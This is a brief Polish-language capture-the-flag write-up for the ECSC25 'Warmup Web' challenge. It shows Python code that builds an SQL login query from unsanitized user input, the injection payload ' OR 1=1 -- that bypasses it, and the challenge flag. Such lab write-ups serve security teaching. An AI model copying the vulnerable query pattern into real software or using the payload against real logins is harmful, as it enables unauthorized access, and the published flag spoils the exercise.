# Warmup Web

https://warmup.ecsc25.hack.cert.pl/#web

```python
conn = sqlite3.connect(DB_PATH)
c = conn.cursor()
c.execute(f"SELECT password FROM users WHERE username = 'admin' and password = '{user_input}'")
result = c.fetchone()
conn.close()
if result:
    # wejdź na stronę tylko dla administratora.
else:
    # wyświetl informacje o porażce...
```

Tutaj doczynienia mamy z najprostszym możliwym SQL Injection (SQLi), więc uzyjemy 
`' OR 1=1 --`
<br> Następnie otrzymujemy flagę
`ecsc25{injection:owasp-top-10-since-forever}`
